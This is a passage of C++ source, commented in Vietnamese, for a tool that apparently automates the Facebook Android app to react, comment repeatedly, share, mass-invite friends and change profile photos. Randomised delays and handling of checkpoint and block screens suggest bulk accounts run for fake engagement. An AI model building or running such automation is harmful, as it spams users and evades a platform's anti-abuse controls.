            ckbInteract = false;  // Đánh dấu đã react để tránh lặp lại

//            if (ckbShareWall) {
//                handleShareWallVideoLive();
//                ckbShareWall = false;
//            }
            //Comment video live
            if (ckbComment && !isCommented) {
                handleCommentVideoLive(commentContentId); // Bình luận một lần
                isCommented = true;           // Đánh dấu đã bình luận
            }

            //Comment nhiều lần video live
            if (ckbBinhLuanNhieuLan) {
                delay(nudBinhLuanNhieuLanFrom, nudBinhLuanNhieuLanTo,
                      "Continue comment..."); // Trễ giữa các lần
                handleCommentVideoLive(commentContentId); // Bình luận lặp lại
            }
        }
        return NOMAP;
    }

    //Handle interact video live
    bool handleInteractVideoLive() {
        // Input từ người dùng
        string typeReaction = action.getString("typeReaction"); // Loại cảm xúc

        // Bắt đầu tính thời gian
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        // Vòng lặp chính
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout)) {  // Khi timeout
                break;
            }

            string xml = dumpXml();
            string screen = handleScreen(xml);

            // Kiểm tra các điều kiện dừng sớm
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock()) {
                break;
            }

            if (Common::strContains(screen, "_POPUP_"))
                continue;

            if (screen == "FB_SESSION_EXPIRED")
                break;

            Base::updateLine("React...");

            // Gửi yêu cầu react bài viết
            JSON configs = JSON();
            configs.set("typeReaction", typeReaction);
            JSON response = ReactPost(configs);

            bool isReactSuccess = response.getBool("success");

            // Kết thúc hàm ngay khi react thành công
            if (isReactSuccess)
                return true;

            // Nếu phản ứng thất bại và tài khoản bị block thì dừng
            if (!isReactSuccess && IsBlock())
                break;


            delay(3);  // Thêm độ trễ để tránh spam hành động
        }
        return false;
    }

    //Handle comment video live
    bool handleCommentVideoLive(string txtComment) {
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //xử lý input , khai báo thêm biến cần thiết

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.TextView[@text='Write a comment…']",
                    "//android.widget.EditText[@text='Write a comment…']",
                    "//android.widget.ImageView[@content-desc='Send' and @enabled='true']",
            });

            if (element == "//android.widget.TextView[@text='Write a comment…']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.widget.EditText[@text='Write a comment…']") {
                auto [success, content, itemId] = getScriptContent(txtComment);

                if (!success) {
                    saveStatusAcc("Get Script Content", "Failed", 5, Task::FAIL);
                    return NOMAP; // chay tiep hoac dung lai
                }

                // comment, dang bai, .....
                // Common::NLog("Content: " + content, "handleTest");

                inputText("//android.widget.EditText", content);
                // xoa content sau khi su dung

                if (!itemId.empty()) {
                    deleteScriptContent(itemId);
                }
                delay(1);
                continue;
            }
            if (element == "//android.widget.ImageView[@content-desc='Send' and @enabled='true']") {
                tap(element, xml);
                delay(2);
                return true;
            }

        }
        return false;
    }

    //Handle share video live
    bool handleShareWallVideoLive() {
        // Khởi tạo bộ đếm thời gian timeout
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;


        string xml = dumpXml();
        string screen = handleScreen(xml);

        // Kiểm tra điều kiện dừng sớm
        if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock()) {
            return false;
        }

        if (screen == "FB_SESSION_EXPIRED") {
            return false;
        }

        // Gửi yêu cầu chia sẻ bài viết
        JSON configs = JSON();
        JSON response = SharePost(configs);

        bool isShareSuccess = response.getBool("success");

        if (isShareSuccess) {
            Base::updateLine("Share successful...");
            return true;  // Kết thúc hàm ngay khi chia sẻ thành công
        } else {
            Base::updateLine("Share fail...");
            return false;  // Trả về false nếu chia sẻ không thành công
        }
    }


    ResultScreen actionReactReelUid() {
        //input người dùng nhập
        vector<string> txtUid = action.getList("txtIdPost");
        //xử lý input, khai báo thêm biến cần thiết
        int countSuccess = 0;
        int soLuong = txtUid.size();
        //goto

        updateLine("Interact reel " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;
        //loop
        while (true) {
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;

            if (isStopped()) break;
            if (txtUid.empty()) break;
            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;
            string id = txtUid.front();
            Common::removeItem(txtUid, id);

            if (handleReactReelUid(id)) {
                delay(2, 3,
                      "Interact reel " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                      " success, delay");
                countSuccess++;
                if (countSuccess >= soLuong)
                    return DONE;
                updateLine(
                        "Interact reel " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
            }
        }
        return NOMAP;
    }

    //Handle interaction reel
    bool handleInteractReel() {

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            updateLine("React reel...");
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.Button[contains(@content-desc,'Like')]",
            });

            if (element == "//android.widget.Button[contains(@content-desc,'Like')]") {
                tapCenter(element, xml);
                delay(2);
                return true;
            }
        }
        return false;
    }

    //Handle comment reel
    bool handleCommentReel(string txtComment) {
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            updateLine("Comment reel...");
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.Button[@content-desc='Comment']",
                    "//android.widget.EditText[@text='Write a comment…']",
                    "//android.widget.EditText[contains(@text,'Comment as ')]",
                    "//android.widget.EditText[@text='Write a public comment…']",
            });

            if (element == "//android.widget.Button[@content-desc='Comment']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.widget.EditText[@text='Write a comment…']" ||
                element == "//android.widget.EditText[contains(@text,'Comment as ')]" ||
                element == "//android.widget.EditText[@text='Write a public comment…']") {

                auto [success, content, itemId] = getScriptContent(txtComment);

                if (!success) {
                    saveStatusAcc("Get Script Content", "Failed", 5, Task::FAIL);
                    return NOMAP; // chay tiep hoac dung lai
                }
                // comment, dang bai, .....

                inputText("//android.widget.EditText", content);
                // xoa content sau khi su dung

                if (!itemId.empty()) {
                    deleteScriptContent(itemId);
                }
                delay(2);
                tap("//android.widget.Button[@content-desc='Send']");
                delay(2);
                waitNodeHide("//*[@text='Posting…' or @content-desc='Posting…']", 60);
                performAction(Perform::BACK, 2, 2);
                delay(2);
                return true;
            }
        }
        return false;
    }

    //Handle share reel
    bool handleShareReel() {
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop

        while (true) {
            updateLine("Share reel...");
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.Button[@content-desc='Share']",
                    "//android.widget.Button[@content-desc='Share now']",
            });

            if (element == "//android.widget.Button[@content-desc='Share']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.widget.Button[@content-desc='Share now']") {
                if (!existNode("//*[@content-desc='Public']", xml, 0) &&
                    tap("//*[@content-desc='Write Post' or @content-desc='Feed' or @content-desc='Facebook']/following-sibling::*[1]",
                        xml)) {
                    delay(2);
                    if (!SetPrivacyPublic()) {
                        back();
                        delay(1);
                    }
                    xml = dumpXml();
                }
                tap(element, xml);
                delay(2);
                return true;
            }
        }
        return false;
    }

    //Handle react reel by uid
    bool handleReactReelUid(string txtIdPost) {
        //input người dùng nhập
        int nudTimeFrom = action.getInt("nudTimeFrom");
        int nudTimeTo = action.getInt("nudTimeTo");
        bool ckbInteract = action.getBool("ckbLike");
        bool ckbComment = action.getBool("ckbComment");
        string commentContentId = action.getString("commentContentId");
        bool ckbShareWall = action.getBool("ckbShareWall");

        //xử lý input, khai báo thêm biến cần thiết

        //goto
        if (!gotoLink(txtIdPost))
            return false;
        delay(2);

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            delay(nudTimeFrom, nudTimeTo, "View reel...");

            if (ckbInteract)
                handleInteractReel();
            if (ckbComment)
                handleCommentReel(commentContentId);
            if (ckbShareWall)
                handleShareReel();
            return true;
        }
        return false;
    }

    ResultScreen actionInviteFriendLikePage() {
        //input người dùng nhập
        vector<string> txtUid = action.getList("txtId");
        //xử lý input, khai báo thêm biến cần thiết
        int countSuccess = 0;
        int soLuong = txtUid.size();

        //goto

        updateLine("Invite friend like page " + to_string(countSuccess + 1) + "/" +
                   to_string(soLuong));
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;

            if (txtUid.empty())
                break;
            string uid = txtUid.front();
            Common::removeItem(txtUid, uid);

            if (handleInviteFriendLikePage(uid)) {
                delay(2, 3,
                      "Invite friend like page " + to_string(countSuccess + 1) + "/" +
                      to_string(soLuong) +
                      " success, delay");
                countSuccess++;
                if (countSuccess >= soLuong)
                    return DONE;

                updateLine("Invite friend like page " + to_string(countSuccess + 1) + "/" +
                           to_string(soLuong));
                continue;
            }
        }
        return NOMAP;
    }

    // Handle Invite Friend Like Page
    bool handleInviteFriendLikePage(string uid) {
        //xử lý input, khai báo thêm biến cần thiết

        //goto
        if (!uid.empty()) {
            if (!gotoPage(uid))
                return false;
            delay(2);
        }

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.Button[@content-desc='More' or @content-desc='See more']", // See more option
                    "//android.widget.Button[@content-desc='Invite friends']",//bấm invite
                    "//androidx.recyclerview.widget.RecyclerView/child::*[7]",//Node invite
                    "//*[contains(@content-desc,'Select All') or contains(@text,'Select All')][not(contains(@content-desc,'Unselect')) and not(contains(@text,'Unselect'))]",//chọn tất cả
                    "//android.widget.Button[@text='Send Invites']",//nhấn mời
            });
            if (element ==
                "//android.widget.Button[@content-desc='More' or @content-desc='See more']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.widget.Button[@content-desc='Invite friends']" ||
                element == "//androidx.recyclerview.widget.RecyclerView/child::*[7]") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element ==
                "//*[contains(@content-desc,'Select All') or contains(@text,'Select All')][not(contains(@content-desc,'Unselect')) and not(contains(@text,'Unselect'))]") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.widget.Button[@text='Send Invites']") {
                tap(element, xml);
                delay(2);
                return true;
            }
        }
        return false;
    }

    ResultScreen actionInviteFriendJoinGroup() {
        //input người dùng nhập
        vector<string> txtUid = action.getList("txtId");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");
        //xử lý input, khai báo thêm biến cần thiết
        int countSuccess = 0;
        int soLuong = txtUid.size();
        //goto

        updateLine("Invite friend join group " + to_string(countSuccess + 1) + "/" +
                   to_string(soLuong));
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;

            if (txtUid.empty())
                break;
            string uid = txtUid.front();
            Common::removeItem(txtUid, uid);
            if (handleInviteFriendJoinGroup(uid)) {
                delay(nudDelayFrom, nudDelayTo,
                      "Invite friend join group " + to_string(countSuccess + 1) + "/" +
                      to_string(soLuong) + " success, delay");
                countSuccess++;
                if (countSuccess >= soLuong)
                    return DONE;
                updateLine("Invite friend join group " + to_string(countSuccess + 1) + "/" +
                           to_string(soLuong));
                continue;
            }
        }
        return NOMAP;
    }

    // Handle invite friend join group
    bool handleInviteFriendJoinGroup(string uid) {
        //input người dùng
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        //xử lý input, khai báo thêm biến cần thiết
        int soLuongInvite = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countInvite = 0;
        //goto
        if (!gotoGroup(uid))
            return false;
        delay(2);

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.Button[contains(@content-desc,'invite others to join')]",
                    "//android.view.View[@content-desc='Invite' or @text='Invite']",
                    "//*[@content-desc='Welcome' or @text = 'Welcome']",
                    "//*[@text=\"This content isn't available\" or @content-desc=\"This content isn't available\"]",
            });
            if (element ==
                "//android.widget.Button[contains(@content-desc,'invite others to join')]") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.view.View[@content-desc='Invite' or @text='Invite']") {
                tap(element, xml);
                countInvite++;
                delay(2, 3,
                      "Invite (" + to_string(countInvite) + "/" +
                      to_string(soLuongInvite) + ")");
                if (countInvite >= soLuongInvite)
                    return true;

                continue;
            }
            if (element == "//*[@content-desc='Welcome' or @text = 'Welcome']") {
                tap("//android.widget.Button[@content-desc='Back']");
                delay(2);
                continue;
            }
            if (swipeAndScreenNotChange())
                return false;

            if (element ==
                "//*[@text=\"This content isn't available\" or @content-desc=\"This content isn't available\"]"
                || element !=
                   "//android.widget.Button[contains(@content-desc,'invite others to join')]")
                return false;
        }
        return false;
    }

    ResultScreen actionSyncContact() {
        Base::updateLine("actionSyncContact");
        return NOMAP;
    }

    ResultScreen actionChangePassword() {
        Base::updateLine("actionChangePassword");
        return NOMAP;
    }

    ResultScreen actionUpAvatar() {
        //input người dùng nhập
        string galleryId = action.getString("galleryId");
        bool ckbThemKhungAvatar = action.getBool("ckbThemKhungAvatar");
        bool ckbXoaAnhDaDung = action.getBool("ckbXoaAnhDaDung");
        //xử lý input, khai báo thêm biến cần thiết

        vector<MediaS3> lstMedia = getScriptMedia(galleryId);

        if (lstMedia.empty())
            return ERROR;

        Base::updateLine("Up avatar...");

        //goto
        if (!gotoProfileEdit())
            return NOMAP;
        delay(2);

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.view.ViewGroup[.//android.view.ViewGroup[.//*[@text='Profile Picture']]]/android.widget.Button[@content-desc='Edit' or @content-desc='Add']",
                    "//*[@content-desc='Allow access to your camera roll' or @text='Allow access to your camera roll']",
                    "//*[@class='android.widget.Button' and @text='ALLOW']",
                    "//*[@class='android.widget.Button' and contains(@text,'Allow')]",
                    "//android.widget.Button[contains(@content-desc,'Photo') and @clickable = 'false'][1]",
                    "//android.widget.Button[@content-desc='SAVE']",
            });
            if (element ==
                "//android.view.ViewGroup[.//android.view.ViewGroup[.//*[@text='Profile Picture']]]/android.widget.Button[@content-desc='Edit' or @content-desc='Add']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element ==
                "//*[@content-desc='Allow access to your camera roll' or @text='Allow access to your camera roll']") {
                tap("//*[@class='android.widget.Button' and @content-desc='Allow access']", xml);
                delay(2);
                continue;
            }
            if (element == "//*[@class='android.widget.Button' and @text='ALLOW']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[@class='android.widget.Button' and contains(@text,'Allow')]") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element ==
                "//android.widget.Button[contains(@content-desc,'Photo') and @clickable = 'false'][1]") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.widget.Button[@content-desc='SAVE']") {
                if (ckbThemKhungAvatar &&
                    existNode("//*[@text='Add frame' or @content-desc='Add frame']", xml)) {
                    ckbThemKhungAvatar = false;
                    AddFrame();
                    continue;
                }

                tap(element, xml);
                delay(2);

                if (ckbXoaAnhDaDung) {
                    deleteScriptMedia(lstMedia);
                }

                if (waitNodeHide("//android.widget.ProgressBar", 60))
                    return DONE;
                return NOMAP;
            }
        }
        return NOMAP;
    }

    bool AddFrame() {
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//*[@text='Add frame' or @content-desc='Add frame']",//chọn nút thêm khung
                    "//android.widget.ScrollView//android.view.ViewGroup/android.view.ViewGroup//android.widget.Button[not(@content-desc='Option Menu')][1]",//chọn khung
                    "(//androidx.recyclerview.widget.RecyclerView/android.view.ViewGroup//android.widget.Button[@focusable='false'])[1]",//khi chọn khung fb lỗi avatar trắng chọn khung ở dưới
            });

            if (element == "//*[@text='Add frame' or @content-desc='Add frame']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element ==
                "//android.widget.ScrollView//android.view.ViewGroup/android.view.ViewGroup//android.widget.Button[not(@content-desc='Option Menu')][1]") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element ==
                "(//androidx.recyclerview.widget.RecyclerView/android.view.ViewGroup//android.widget.Button[@focusable='false'])[1]") {
                tap(element, xml);
                delay(2);
                return true;
            }
        }
        return false;
    }

    ResultScreen actionUpCover() {
        //input người dùng nhập
        string galleryId = action.getString("galleryId");
        // new field
        bool ckbXoaAnhDaDung = action.getBool("ckbXoaAnhDaDung");
        //xử lý input, khai báo thêm biến cần thiết
        vector<MediaS3> lstMedia = getScriptMedia(galleryId);

        if (lstMedia.empty())
            return ERROR;

        Base::updateLine("Up cover...");

        //goto
        if (!gotoProfileEdit())
            return NOMAP;
        delay(2);

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.view.ViewGroup[.//android.view.ViewGroup[.//*[@text='Cover Photo']]]/android.widget.Button[@content-desc='Edit' or @content-desc='Add']",
                    "//*[@content-desc='Allow access to your camera roll' or @text='Allow access to your camera roll']",
                    "//*[@class='android.widget.Button' and @text='ALLOW']",
                    "//*[@class='android.widget.Button' and contains(@text,'Allow')]",
                    "//android.widget.Button[contains(@content-desc,'Photo') and @clickable = 'false'][1]",
                    "//*[@class='android.widget.Button' and @content-desc='SAVE']",
            });

            if (element ==
                "//android.view.ViewGroup[.//android.view.ViewGroup[.//*[@text='Cover Photo']]]/android.widget.Button[@content-desc='Edit' or @content-desc='Add']") {
                tap(element, xml);
                delay(2);
                continue;
            }

            if (element ==
                "//*[@content-desc='Allow access to your camera roll' or @text='Allow access to your camera roll']") {
                tap("//*[@class='android.widget.Button' and @content-desc='Allow access']", xml);
                delay(2);
                continue;
            }
            if (element == "//*[@class='android.widget.Button' and @text='ALLOW']"
                || element == "//*[@class='android.widget.Button' and contains(@text,'Allow')]"
                || element ==
                   "//android.widget.Button[contains(@content-desc,'Photo') and @clickable = 'false'][1]") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[@class='android.widget.Button' and @content-desc='SAVE']") {
                tap(element, xml);
                delay(2);

                if (ckbXoaAnhDaDung) {
                    deleteScriptMedia(lstMedia);
                }


                if (waitNodeHide(
                        "//*[@content-desc='Edit Cover Photo Button']/parent::*/parent::*/following-sibling::*",
                        60))
                    return DONE;
                return NOMAP;
            }
        }
        return NOMAP;
    }

    ResultScreen actionRemovePhoneNumber() {
        Base::updateLine("actionRemovePhoneNumber");
        return NOMAP;
    }

    ResultScreen actionEnableDisable2fa() {
        Base::updateLine("actionEnableDisable2fa");
        return NOMAP;
    }

    ResultScreen actionAddMail() {
        Base::updateLine("actionAddMail");
        return NOMAP;
    }

    ResultScreen actionChangeName() {
        Base::updateLine("actionChangeName");
        return NOMAP;
    }

    ResultScreen actionUpdateInfo() {
        Base::updateLine("actionUpdateInfo");
        return NOMAP;
    }

    ResultScreen actionLogoutOldDevice() {
        Base::updateLine("actionLogoutOldDevice");
        return NOMAP;
    }

    ResultScreen actionRemoveTrustedDevice() {
        Base::updateLine("actionRemoveTrustedDevice");
        return NOMAP;
    }

    ResultScreen actionEnableDeveloperAccount() {
        Base::updateLine("actionEnableDeveloperAccount");
        return NOMAP;
    }

    ResultScreen actionRemovePostOnWall() {
        //input người dùng nhập
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");

        //input thêm biến xử lý nếu cần thiết
        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;

        //goto
        if (!gotoProfile())
            return NOMAP;
        delay(2);

        updateLine("Remove post..." + to_string(countSuccess + 1) + "/" + to_string(soLuong));
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.Button[@content-desc='Post menu' or @content-desc='More']",//nhấn vào post menu
                    "//android.view.ViewGroup[./android.widget.Button[@content-desc='Copy link' or @content-desc='Hide from profile'] and not(./android.widget.Button[@content-desc='Move to trash Items in your trash are deleted after 30 days.']) and not(./android.widget.Button[@content-desc='Delete '])]",//nếu mục lục không có nút xóa
                    "//*[@content-desc='Move to trash']",//nút xóa sẽ xóa sau 30 ngày
                    "//android.widget.Button[@content-desc='Delete ']",
                    "//android.widget.Button[@text='MOVE']",// xác nhận xóa
                    "//android.widget.Button[@text='DELETE']",
            });

            if (element ==
                "//android.widget.Button[@content-desc='Post menu' or @content-desc='More']") {
                tapCenter(element, xml);
                delay(2);
                continue;
            }
            if (element ==
                "//android.view.ViewGroup[./android.widget.Button[@content-desc='Copy link' or @content-desc='Hide from profile'] and not(./android.widget.Button[@content-desc='Move to trash Items in your trash are deleted after 30 days.']) and not(./android.widget.Button[@content-desc='Delete '])]") {
                back(1, 1);//nếu không có nút xóa thì back về và vuốt
                delay(2);
                swipeAndScreenNotChange(1, 2);
                continue;
            }
            if (element == "//*[@content-desc='Move to trash']" ||
                element == "//android.widget.Button[@content-desc='Delete ']") {
                tapCenter(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.widget.Button[@text='MOVE']") {
                tapCenter(element, xml);
                countSuccess++;
                if (countSuccess >= soLuong)
                    return DONE;
                delay(2);
                gotoProfile();
                delay(nudDelayFrom, nudDelayTo,
                      "Remove post..." + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                      " success, delay");
                timeStart = high_resolution_clock::now();
                continue;
            }
            if (element == "//android.widget.Button[@text='DELETE']") {
                tapCenter(element, xml);
                countSuccess++;
                if (countSuccess >= soLuong)
                    return DONE;
                delay(nudDelayFrom, nudDelayTo,
                      "Remove Post " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                      " success, delay");
                timeStart = high_resolution_clock::now();
                continue;
            }
            updateLine("Remove Post " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                       ", swipe");
            if (swipeAndScreenNotChange())
                return NOMAP;
        }
        return NOMAP;
    }

};